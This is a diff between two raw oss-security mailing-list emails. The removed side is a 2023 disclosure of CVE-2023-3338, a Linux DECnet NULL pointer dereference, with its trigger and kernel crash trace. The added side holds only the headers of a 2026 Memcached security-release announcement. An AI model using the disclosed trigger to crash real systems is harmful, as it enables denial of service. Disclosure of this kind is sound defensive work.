@@ -1,4 +1,4 @@
-Received: (qmail 28477 invoked by uid 550); 24 Jun 2023 16:24:00 -0000
+Received: (qmail 9223 invoked by uid 550); 19 May 2026 17:14:20 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,254 +7,257 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 19719 invoked from network); 24 Jun 2023 16:11:50 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=betrusted.it; s=mail;
-	t=1687623097; bh=uheHTf4firohuXazRbTzYfMKv8TlhPIllvxtdRIeg7s=;
-	h=From:To:Subject:Date;
-	b=piDFx6fegH1ZVDR4BhogpJo57CEWXtZvxDfFfoSVLrpuY11ZK/0BQSKcgoL4tVIYL
-	 BXnwtpR9FBw3Pu6j9hJJSKYlNibEtQHM6yPNCy1LgIcLmulbhecuJVdUNToN3VaWRf
-	 tAjmcnB5k3FEkGGgF4RnsRpLYP31xAvNW5eJrkIhXmh8ROS8FKfrP5AAZ51HoKCpjY
-	 CKXt0z4qQWxLLm6Ahsgtp28tOknVuWl5Kqm93xDf7cBM49H7s0Xlz0qgj0CLHtP4/m
-	 HwuVUnUKpEU9pFYL2i5H9IoiE1B8NmrNwB9KKxYkr336OGx1alb0uRACWSoxGptpKA
-	 7zWZsQgtybtbg==
-From: Ornaghi Davide - Betrusted <davide.ornaghi@betrusted.it>
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-Thread-Topic: CVE-2023-3338: Linux Kernel NULL Pointer Dereference in DECnet
-Thread-Index: AQHZprVJVPR38JYSMU67sNHYy+/N1Q==
-Date: Sat, 24 Jun 2023 16:11:36 +0000
-Message-ID: <92b180310a434c8bbca9b2449180d85d@betrusted.it>
-Accept-Language: it-IT, en-US
-Content-Language: it-IT
-X-MS-Has-Attach:
-X-MS-TNEF-Correlator:
-x-originating-ip: [192.168.140.1]
-x-c2processedorg: 3c642b5e-0ab0-4568-9f09-fc6a11a1a8a0
-Content-Type: multipart/alternative;
-	boundary="_000_92b180310a434c8bbca9b2449180d85dbetrustedit_"
+x-ms-reactions: disallow
+Received: (qmail 8178 invoked from network); 19 May 2026 17:14:20 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=
+	content-transfer-encoding:content-type:date:from:message-id
+	:mime-version:subject:to; s=corp-2025-04-25; bh=EKwb5FPeSBv5le3k
+	xKiS9j8QW/59VJCOjztyFvst3g4=; b=bosmjNN3I6h1wyxDrVAdMWD2d6vsAD2K
+	OU53kxuFAhgyoLw+cwgUnugaBMr5wmRfLnmIe7CGJCJs4R/LsgTXwXAXVRUZAS1o
+	R2GfbfRunKpAA7Kh9lYntqww0oi7M4+KY/CEiYID8vR9s/QRUjVlCZiNiIRQRzXO
+	4HaKjJ+fECJeMPShcdN9Zii7aMlZItrtUyOghD8RFBNSKPbI7uvpOHzenr05EXrx
+	+JxonqBOFMglx7b42uAIYp4HLnPWbH7giPrt1rhNQf9x2GOHgiOh55oI4lQdJ9ze
+	YX4/CbY6yaJx3T0aQ0S8NNVhrHgJRSwrZGqi296yr3/AHIFXLimI+g==
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=sYeatCftewexD8RMsovJbuDFiGFmhqM6SD0MH51ifuAFPIBtjpF9J/5XvuLt8uCkcLmTeWMbsdW21jUFb2aKuJ8cW6nd8R6tGbFAsfMzvM6Vlf/EZyRRmVCHXr/K9w2VSvJ/OIrpW888RZ+JTKihVu6TbvM7yKvZ1i9Et4ajraGRmW2NRAljtW/mZpAhYgqaHnUz9z2ZvZKKJUG718yYXEwAHcoKxe3TFDKse0HXzcpaBzFV2jNFbuvPno5t7hRGEMW0rtyhiw0OEfPXK5F/Quau7KB3noNswySHM8szbkvUT3AU5/RkzlqUAuv0jvQ6uhq3AKtZe9OXK2lWeXSEIg==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=EKwb5FPeSBv5le3kxKiS9j8QW/59VJCOjztyFvst3g4=;
+ b=t2DWwjnPT8uW0OHnuzNkmAVDKhphwRtM6OgWpH8WDwU9mJYfleDD2yPztk2dFxJSGF0DiQUwe9fuAaBO8/tB1q5/s0VM/KUCv+IyTXIa/TT6HaSz/bIZlF1burXYAk5TE7mYTF/X3MoWHdqA2is1i7WkD/BTko9JlwXc8wW/gh+9SQIBfmZK92g3DzFwQ02TqBBnBaxv9VI/3JuNIfweaVjI2okfYew6ouI72/cXZ2WZ4LeETObdlS22yeU2BPIWMuhA+ZoS1PKUqeBjlCzVVCHzXHXegeFd6IuTFheha1euEnkx2dYh+CgcwV8GFdxFoCN6rNSS94Fo13y+KjsCsQ==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
+ dkim=pass header.d=oracle.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=EKwb5FPeSBv5le3kxKiS9j8QW/59VJCOjztyFvst3g4=;
+ b=s05GdiXWGOoRAg6iZZLzRjqMJYtujiJ7ErUPzh+bm7ogu0s4mPukYoEVAz539Aiw77l5whQAkDRWWasBmd6xEoYt6a6a4AJvbRFm5YUr8frc7QUWwVYQsWuvOeTIRk3d8u4SkEM7vMQlT8998mXs37/UtdSQjRzJB540AaBhbnQ=
+Message-ID: <c4f7f03e-194d-4a1a-9c9a-5f8a791e5051@oracle.com>
+Date: Tue, 19 May 2026 10:14:00 -0700
+User-Agent: Mozilla Thunderbird
+From: Alan Coopersmith <alan.coopersmith@oracle.com>
+Content-Language: en-US
+To: oss-security@lists.openwall.com
+Autocrypt: addr=alan.coopersmith@oracle.com; keydata=
+ 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
+ 5V9JclVH6u5Gug==
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 7bit
+X-ClientProxiedBy: PH8P221CA0024.NAMP221.PROD.OUTLOOK.COM
+ (2603:10b6:510:2d8::30) To CH3PR10MB6739.namprd10.prod.outlook.com
+ (2603:10b6:610:147::6)
 MIME-Version: 1.0
-Subject: [oss-security] CVE-2023-3338: Linux Kernel NULL Pointer Dereference in DECnet
+X-MS-PublicTrafficType: Email
+X-MS-TrafficTypeDiagnostic: CH3PR10MB6739:EE_|SJ0PR10MB4608:EE_
+X-MS-Office365-Filtering-Correlation-Id: e2d47d8f-ce8a-4adc-66c8-08deb5ca06be
+X-MS-Exchange-SenderADCheck: 1
+X-MS-Exchange-AntiSpam-Relay: 0
+X-Microsoft-Antispam:
+	BCL:0;ARA:13230040|376014|1800799024|366016|56012099003|18002099003|3023799006;
+X-Microsoft-Antispam-Message-Info:
+	YPB4IAYk4pxqr9IAWMhdNJY4blE/PCq2Beu3dK4I1Karsd5ZhsnQxN/6AIHMlc2L1l/kSpJVDEvqDGE4PdAr+niLmjqGDcubitttxkih7eA4rT/soXRRsqFjsTKd8TCAjkt54ogzC/adTiVnvfemc0SJYVX183UTnJ/SYBuhm0e7gcEu7Rb0RRbVzcPnM2/acjJKiO1HWuDogOq7yB8t8n2g690MwqKZTJXD2YDucTyJx5bJoFyIDWa6jdrOtNxqZakVc7Wlepv2vcFgpC4v+JYB+LC6qrD1vK90dXxAEIyM+SdThuXPkcI46jj6lu2Th9djJtM2qKkUPLmumoad9+XJJdZsJ7QnTN3fI14qkNo2yX2GPUQ3RwJBZG2ewKNIpaH3iJk3SxzlzgitcQ57NteIvz+oBcBg45V4rSkDT0sDqTywKhxM4VOzNCeWFQjCu2E1LZaw8PW+cnuA8n9JvzfTHiQ4iuXcp+E0lNoG+tyn716MZXcJSGp0qknMuXwUy2F+IYbY+I5E46BFOYx8NJ1mjgkE4hX2mzXjUqKdP2KZmt3kJk9iU+ImG5wP5UTVQRQpnTcOTgU3y+SEdju5d7TiqV8jsyhCZn7/bqRioFhDfjXoNhGUBdCuZrhqvI+j4+qaJpfFPI6OTAF2He2Q+g==
+X-Forefront-Antispam-Report:
+	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:CH3PR10MB6739.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(376014)(1800799024)(366016)(56012099003)(18002099003)(3023799006);DIR:OUT;SFP:1101;
+X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-MessageData-0:
+	=?utf-8?B?RFczQUJEelg4ZGZ4K2p2bVVMRGttNzhNTk9MVmhvTVZTajZjaDNleVpWQnQ2?=
+ =?utf-8?B?UE0zUWh5Z2ZzZTBDaXVFT3ZCb1NxckRWeCsxR0R5a205eGRwMFo3Z0NMWWxE?=
+ =?utf-8?B?ZjBDdnh6ZGxZcktTcVRacmd4S3lRanNMVlBGYlU3aXZXQ0tsK2tmRUJzemQ4?=
+ =?utf-8?B?c0szc01DMUw3WFpKYWFQREdNRG9KWHFhYWpVaWxmTlEra3VPaTh3SXlETHB5?=
+ =?utf-8?B?V3BndzBnRzRLdWIxU1RRNUJKZlRjaTNpOVR5dzd6QktUbE4vdUFZZ2diQ0VT?=
+ =?utf-8?B?WmZCQTVuaHMvOEt1Z2ZzQlVxTm9zWS9pRGkwQ0h2WEJacGdYZmVHU2VBbmpD?=
+ =?utf-8?B?RFg5Q2hUMUtmQWl2dTMxeU96SGJrOUlzUmZCY3Fucjk1NFRqZGVXb2o2V21L?=
+ =?utf-8?B?cS95L3BvQ2I5QzBnQ1RSWXh2TVJpZUpvRWhQTlJJVTNFQzdJd1VYQkd6REtP?=
+ =?utf-8?B?cDRpczMrQWhKZjZuR3VRS1gyUThxZ2EzeEhIaU5FeDlDVjBaVE9qMG9mS1ho?=
+ =?utf-8?B?aFRCejFuZG9haHF0QnpSekdYV1lUdFZmbFl4UmUyUEtvSW9nVzliWTE4MnB1?=
+ =?utf-8?B?ajVCbC9iL3ROVklGWERjQWxiMkJzeU5jenRMUWNTY05kRVg0YldGelhJRFgr?=
+ =?utf-8?B?VVg1SHFCWU9hN0dTWDdYT01Ld24zVHVqaCtSUGtMN2k3MENzdlJSdCtJd0xk?=
+ =?utf-8?B?MkwxbTdTQTlmSDBwMlNqOTcwOEVCcC8ybWhDcWVFTWlSYU5URnhkc1hqc2dE?=
+ =?utf-8?B?NDFZYjVLWitDNFRFQkVMNHJZOEo1SGFwSVY0SkZtSGZGbngxbGVCZWpXTTlW?=
+ =?utf-8?B?cy9aWTVsS1BERTBmRE5jZG1LN2NycnZQdVJJYmJYdG5wVjZQQnVQUlpqMVJy?=
+ =?utf-8?B?ZGFjZ2lsWEdxSFJvbWMveVFsa3JweldjN3FqbFBmRzdSV3VuK0NHODNlbUhN?=
+ =?utf-8?B?SGx3MEJRTHdUUFYwY3o4MkxodkNweHhnUjNkT1JaK1lJWkowdlM1R1Z6dTVX?=
+ =?utf-8?B?bGtQejlkUG4zdUh2VEp4N3BVazAydzVlOVN4Vjl0WVM5emVkS05vbTVRZ2Jw?=
+ =?utf-8?B?NEM3WGhCRFdlRlk3bjU4NW1SNHhlNnhORjlTSGxSUlhlYk9JUnlKN1I0dTFr?=
+ =?utf-8?B?dHl0Y0tuYjBBR3RDTWJkVUZnUkdQcXk3Tm8wVkVxQWpEcllSL1drcDNGTWNx?=
+ =?utf-8?B?ZExlaURBaCtVU3FNUlYzck1nYkEvc3NHZzdlU2VsejhodUFOSjJQYXgrL1E4?=
+ =?utf-8?B?a0N4ZGMwWFEwYnZ4cFBHREY1S21xci90NUppWTBVc21HTGpDeVdJWk1GSlda?=
+ =?utf-8?B?YzFyZW0rb1pPUmpxOXU1WDhOZ1ZaeDNQamxIZ3oxcjNqZWVQVDBXem9aaU5Z?=
+ =?utf-8?B?WnpyQi9uZitUQ3RxaHl3ZVlJam1hMS9CMHFEVGNySktlS2o2RUd4SzgzQk9R?=
+ =?utf-8?B?Z3U4V1loUkJlekhKNTN6a1NubGw3K0FBU3dMYkI1Y1VPVWtDMUlQVXRXbTRJ?=
+ =?utf-8?B?dUNQOHBCNHl5blliQTlHRmlDTmVnMW00U0o4T3ZSZ3ZaSXlNOWtUL05GNURq?=
+ =?utf-8?B?MmZoMkhucVR6SGRoZEFodXhaR0l3c05EWGZ6Rkt3RUIrQkdHbFY4WVQ5elB0?=
+ =?utf-8?B?RmJkTFRDNlMrQ21qcWxDVmhzTWl5WkpTNm11dUJPbFZWZ2krVUQ2ZTdtU1Bi?=
+ =?utf-8?B?OXZDREJDV3lWMnVRZFozdFJDRzlsTS9pbFVhdDZXcTMyWjdqWkw3T1M5SkhY?=
+ =?utf-8?B?cmZyNEhUbzFISkJNeXEvRFErZmFEUVkwS1BDeXYraFdHaGZDeXdMK3VmcTBC?=
+ =?utf-8?B?NVBWbElBdklwS0tCejFYQktSdXlZNlZYMDhxSGFBU2hCWU9XcjdiZXJCN21L?=
+ =?utf-8?B?bXRjcUNIeFcvMlZqWnY2SkhxcXM4bXdnUzJQdkhBVzlSRG9BbzVKM1QrRnBm?=
+ =?utf-8?B?a0ZVWGxNcTQ0OHk0bWtpc1JEZGZoaVV3N2dlMW9BUTd0TFludlZXM2lqNG1l?=
+ =?utf-8?B?alU1RXUwdjJlY0dDSjhiQW9nTnA2Unp6R2FsVWx6ZW5mZHYzYTRiQTMrR2Rt?=
+ =?utf-8?B?NE9tTmgwOFYraGtuSlVITkdmU1FPRjJzd3pBL3o5K3JRTUlVdDdtODZzL2Jz?=
+ =?utf-8?B?NU9rTE9OZ012N0h3TmxvV0NVL3dyMWVRcFlERXc0cWRCcE1GYW5vVHh0dFEx?=
+ =?utf-8?B?UUYzcTIrMVVwN0xsRnpFcUN0UVdQclAveEltemlQeFRVYkdJc3hyU1NzYXBU?=
+ =?utf-8?B?bElkSFZna3htbDFzMVFXN3ZJL1VvUE8xZStiVDJlR0FiWW9nTWpRRUlNcklI?=
+ =?utf-8?B?YVpxNzZyOEVtWTE2R1g0MDhuejdMZFljTW9pV3dFTzNNYjRFek5WN0lJR1Vs?=
+ =?utf-8?Q?802RG2lj2MaEchhM=3D?=
+X-Exchange-RoutingPolicyChecked:
+	cNeaHnNUk/h5mA7lQGPE7FtR8jHFtu2VNUW8Z5fFsmaKlEuLKlwK+lsjRKW8xZr1AY2pSoqds1Ca192Ou+QHnimmzA60A+BDPn04xl4H29Th+vRmqEIeKqwdVJomb13hgxPTS3sCW0YHqs8OeW05qgOjEZMyfLvJdKgmlF25fjoiPgH+yAiRyLj1WqN6mZBw5u0HhDFUaVP9CC39hEyK03tfGmFpL8WygfjKMnP2svXTbEolBgTzWQgg834B4+rh8OGXx+yQu85vQ3y8FpgW/LUodn0rjovJD8u0TbFvKwb89m3iNdJ9l9bHvelSXJO3UYlDLb7lHzy+/X+W6h9+zg==
+X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
+X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0:
+	G7uvF+wBYZeH4LS42B/b2/d5TwhUmHsFNHUOTrcX1o7T6OmrN9dYr1WXajyS9nXj0s0mUNdHxW7EkSwmwapM45UKaxl1KbP6gikmAmrqn0v5yw36SWC9Juc/iW3KrUj9h6T7/QbpSmwEny+DNfCBU9yIDeGNbkgMwg1OFjxHnXvyFb3UzIK3eeF/9i08XSD3wdySLB8omy5q5yTdr5/SFe8WkX1M0U5yFt1aSUmgWZofdA+b88xpF+azTHQwJJP9ecAyg9hcZKM3uCW1ZRrJc6pXYH7ip9Y6wZd9IBGaN8c6h1lZRwfRy365iWtlHoh244yJY+Q5ihMUIuamwiFFOrVleaMvubPo2kgevy5klSgx/o5qi1oiaiVslc5CxAJFdgpy+YHLoqhCJpJAl8pgx+wSv/9bGsTryRtdUVsTCjc0iFqjF0iNvQX0Q3T4n2F4K3lFkiQ7O3PKlxydWOJP5ZkZByLfkYtledI7hapKrVLWIgyvyubJ3tVlHVHDGyO6ad/LFBvYuX/GydaqczlcESLwAeDeSuBFxbQVMQamq7rVTSNxCHPjMVZYvRs9Vb3UEojTwP9EQXi7k7ExMV5o3OsGVjBS0OsBL5zxqE2AB2c=
+X-OriginatorOrg: oracle.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: e2d47d8f-ce8a-4adc-66c8-08deb5ca06be
+X-MS-Exchange-CrossTenant-AuthSource: CH3PR10MB6739.namprd10.prod.outlook.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 19 May 2026 17:14:03.6911
+ (UTC)
+X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
+X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
+X-MS-Exchange-CrossTenant-MailboxType: HOSTED
+X-MS-Exchange-CrossTenant-UserPrincipalName: 4L3UHROl1ae3oQ0utcot7OqWf35q44/bX9VUJp+TbO1ktPJm/+vQOqKaZVZ7nXMEnvpm5Ae+Hc6MEzzKNjUd3IGa4CcY+FlMPKKxp+9Hi4k=
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: SJ0PR10MB4608
+X-Proofpoint-Virus-Version: vendor=baseguard
+ engine=ICAP:2.0.293,Aquarius:18.0.1143,Hydra:6.1.51,FMLib:17.12.100.49
+ definitions=2026-05-19_04,2026-05-18_01,2025-10-01_01
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 phishscore=0
+ bulkscore=0 lowpriorityscore=0 adultscore=0 mlxscore=0 suspectscore=0
+ spamscore=0 malwarescore=0 mlxlogscore=999 classifier=spam adjust=0
+ reason=mlx scancount=1 engine=8.19.0-2605130000 definitions=main-2605190171
+X-Authority-Analysis: v=2.4 cv=UOjt2ify c=1 sm=1 tr=0 ts=6a0c9a61 cx=c_pps
+ a=XiAAW1AwiKB2Y8Wsi+sD2Q==:117 a=XiAAW1AwiKB2Y8Wsi+sD2Q==:17
+ a=6eWqkTHjU83fiwn7nKZWdM+Sl24=:19 a=z/mQ4Ysz8XfWz/Q5cLBRGdckG28=:19
+ a=lCpzRmAYbLLaTzLvsPZ7Mbvzbb8=:19 a=xqWC_Br6kY4A:10 a=IkcTkHD0fZMA:10
+ a=NGcC8JguVDcA:10 a=GoEa3M9JfhUA:10 a=VkNPw1HP01LnGYTKEx00:22
+ a=jiCTI4zE5U7BLdzWsZGv:22 a=3I1J8UUJPc9JN9BFgKH3:22 a=NEAV23lmAAAA:8
+ a=P548ySWuAAAA:8 a=wpjeoAaxng8NuNP13zgA:9 a=QEXdDO2ut3YA:10
+ a=dtHbOJcC6pB8gVwlmWzd:22
+X-Proofpoint-ORIG-GUID: 1pYAZjmc0FVrogzeY-B7xTTd_Fu5YUNn
+X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwNTE5MDE3MiBTYWx0ZWRfX6yGKpammSo05
+ 9T25Lo9IgCSVsUSEHdMslGfEmSeJCvZiujRbBi1y1h/t9O20d28VCjeUE0eecmb3oBynvXX4lRN
+ OzQ463ZFQ/CRHaTx8ZFDaf/LFTv3BKOyL2Faxls5ftnqciiIc4duJCBcWeYj7RJWAxgQ+TrsZPk
+ R4EJI4Ab5/pU5hDpWR1eRkBusI2F2wsx0BQvPVdsYEuP3OJC9R9xThynLc1nKi2dXfXUbvpHB+e
+ 6se+x7z3SJ46evu4ggwc/sh1bs/K/BEyt+59/FFsY4TOlkn/zcA0sTus0tk2UuMPt3f83NILl3U
+ 2LRuh57hh6ZCCxMbtQ5lwazHG31gVJO84jiLZjtcj1KML9rtnapTJH+0Oxx4TwEabturryRmALy
+ LCkyjYiUBGf9d0q3uyhKXQzW5HiR9afVs9/zCqKr+Se/S5PWl5T6n/c6JvCw2+ZZLLMfCdqUiXs
+ NjuBEddBfXfDohgUB1w==
+X-Proofpoint-GUID: 1pYAZjmc0FVrogzeY-B7xTTd_Fu5YUNn
+Subject: [oss-security] Memcached 1.6.42 is a "major security focused release"
+ with CVE's TBD
 
---_000_92b180310a434c8bbca9b2449180d85dbetrustedit_
-Content-Type: text/plain; charset="iso-8859-1"
-Content-Transfer-Encoding: quoted-printable
-
-Hi all,
-
-
-
-I'm reporting a Null Pointer Dereference vulnerability that I found while a=
-ttempting to ping localhost by sending a Hello message to a local DECnet so=
-cket:
-
-
-
-```
-[45620.986136] BUG: kernel NULL pointer dereference, address: 0000000000000=
-000
-[45620.986141] #PF: supervisor read access in kernel mode
-[45620.986143] #PF: error_code(0x0000) - not-present page
-[45620.986146] PGD 0 P4D 0
-[45620.986148] Oops: 0000 [#1] PREEMPT SMP NOPTI
-[45620.986152] CPU: 6 PID: 37997 Comm: test Tainted: G        W    L    5.1=
-9.0-43-generic #44~22.04.1-Ubuntu
-[45620.986155] Hardware name: VMware, Inc. VMware Virtual Platform/440BX De=
-sktop Reference Platform, BIOS 6.00 11/12/2020
-[45620.986156] RIP: 0010:dn_nsp_send+0x1c9/0x200 [decnet]
-[45620.986159] Code: 74 3e 8d 48 01 f0 0f b1 4a 40 41 0f 94 c6 45 84 f6 74 =
-eb 48 89 d3 49 89 d7 48 83 e3 fe 48 89 55 90 e8 eb f7 ac c0 48 8b 55 90 <48=
-> 8b 02 48 8b 80 e8 00 00 00 49 89 85 e8 01 00 00 e9 93 fe ff ff
-[45620.986161] RSP: 0018:ffffc90032abfc90 EFLAGS: 00010246
-[45620.986164] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 00000000000=
-00000
-[45620.986165] RDX: 0000000000000000 RSI: 0000000000000000 RDI: 00000000000=
-00000
-[45620.986166] RBP: ffffc90032abfd00 R08: 0000000000000000 R09: 00000000000=
-00000
-[45620.986167] R10: 0000000000000000 R11: 0000000000000000 R12: ffff8881aca=
-6f9c0
-[45620.986168] R13: ffff888118903cc0 R14: 0000000000000000 R15: 00000000000=
-00000
-[45620.986172] FS:  00007f144e58b740(0000) GS:ffff888339d80000(0000) knlGS:=
-0000000000000000
-[45620.986173] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
-[45620.986175] CR2: 0000000000000000 CR3: 0000000226154004 CR4: 00000000007=
-70ee0
-[45620.986185] PKRU: 55555554
-[45620.986186] Call Trace:
-[45620.986189]  <TASK>
-[45620.986191]  dn_nsp_send_conninit+0x207/0x4c0 [decnet]
-[45620.986196]  __dn_connect+0x172/0x230 [decnet]
-[45620.986220]  dn_connect+0x5c/0xa0 [decnet]
-[45620.986223]  __sys_connect_file+0x68/0x80
-[45620.986225]  __sys_connect+0xb6/0xe0
-[45620.986227]  ? exit_to_user_mode_loop+0xf1/0x140
-[45620.986228]  ? exit_to_user_mode_prepare+0x3b/0xd0
-[45620.986230]  ? syscall_exit_to_user_mode+0x2a/0x50
-[45620.986232]  ? do_syscall_64+0x69/0x90
-[45620.986234]  __x64_sys_connect+0x18/0x30
-[45620.986236]  do_syscall_64+0x59/0x90
-[45620.986237]  ? exit_to_user_mode_prepare+0x3b/0xd0
-[45620.986241]  ? syscall_exit_to_user_mode+0x2a/0x50
-[45620.986242]  ? do_syscall_64+0x69/0x90
-[45620.986244]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
-```
-
